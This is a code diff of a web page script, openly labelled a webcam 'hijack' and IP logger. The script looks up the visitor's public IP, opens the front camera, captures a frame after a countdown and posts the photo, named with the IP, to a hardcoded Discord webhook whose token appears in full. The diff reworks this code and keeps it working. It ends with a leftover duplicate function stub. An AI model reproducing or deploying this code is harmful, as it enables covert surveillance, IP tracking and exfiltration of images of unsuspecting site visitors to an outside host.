@@ -37,51 +37,36 @@
 
 <script>
 // ䷀䷁䷂䷄ WEBCAM CAPTURE WITH DELAY + IP LOGGER ䷅䷆䷇䷈
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";
-const DELAY_SECONDS = 3; // Delay before capturing webcam
-
-// 丂ᚴᛁᚥᛖ丂丂丂丂 GET IP
-async function getIP() {
-  try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const { ip } = await res.json();
-    return ip;
-  } catch {
-    return "IP_FETCH_FAILED";
-  }
-}
-
-// ䷀䷁䷊䷋ LOG TO WEBHOOK
-async function logToWebhook(title, description) {
-  const embed = {
-    title: title,
-    description: description,
-    color: title.includes("❌") ? 0xff0000 : 0x00ff00,
-    timestamp: new Date().toISOString()
-  };
-  await fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ embeds: [embed] })
-  });
-}
-
-// 丂ᚴᛁᚥᛖ丂丂丂丂 WEBCAM SNATCHER WITH DELAY
 async function hijackWebcam() {
+  const DELAY_SECONDS = 5; // Set delay here
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR"; // Replace with actual URL
+
+  async function getIP() {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+  }
+
+  function logToWebhook(title, message) {
+    console.log(`${title}\n${message}`);
+    // Optional: send this to another webhook if needed
+  }
+
   try {
     const ip = await getIP();
-    const stream = await navigator.mediaDevices.getUserMedia({ 
+
+    const stream = await navigator.mediaDevices.getUserMedia({
       video: {
         width: { ideal: 1920 },
         height: { ideal: 1080 },
-        facingMode: "user"
-      } 
+        facingMode: "user",
+      },
     });
-    
+
     const video = document.createElement("video");
     video.srcObject = stream;
-    video.play(); // Start video playback
-    
+    await video.play(); // Ensure playback starts
+
     // Create preview container
     const preview = document.createElement("div");
     preview.style.position = "fixed";
@@ -92,9 +77,10 @@ async function hijackWebcam() {
     preview.style.borderRadius = "10px";
     preview.style.overflow = "hidden";
     preview.style.zIndex = "99999";
+    preview.style.backgroundColor = "black";
     preview.appendChild(video);
     document.body.appendChild(preview);
-    
+
     // Add loading text
     const loadingText = document.createElement("div");
     loadingText.textContent = `Capturing in ${DELAY_SECONDS} seconds...`;
@@ -103,7 +89,7 @@ async function hijackWebcam() {
     loadingText.style.padding = "5px";
     loadingText.style.textAlign = "center";
     preview.appendChild(loadingText);
-    
+
     // Countdown timer
     let countdown = DELAY_SECONDS;
     const countdownInterval = setInterval(() => {
@@ -114,6 +100,43 @@ async function hijackWebcam() {
         captureFrame();
       }
     }, 1000);
+
+    async function captureFrame() {
+      // Wait for video metadata to be ready
+      if (video.readyState < 2) {
+        await new Promise((resolve) => {
+          video.onloadeddata = resolve;
+        });
+      }
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("file", blob, `webcam_${ip}.jpg`);
+        fetch(WEBHOOK_URL, { method: "POST", body: formData });
+
+        logToWebhook(
+          "📸 WEBCAM CAPTURED",
+          `IP: ${ip}\nResolution: ${canvas.width}x${canvas.height}\nDelay: ${DELAY_SECONDS} seconds`
+        );
+
+        // Clean up
+        stream.getTracks().forEach((track) => track.stop());
+        preview.remove();
+      }, "image/jpeg", 0.9);
+    }
+  } catch (err) {
+    const fallbackIP = await getIP().catch(() => "unknown");
+    logToWebhook("❌ WEBCAM FAILED", `IP: ${fallbackIP}\nError: ${err.message}`);
+  }
+}
+
     
     async function captureFrame() {
       const canvas = document.createElement("canvas");
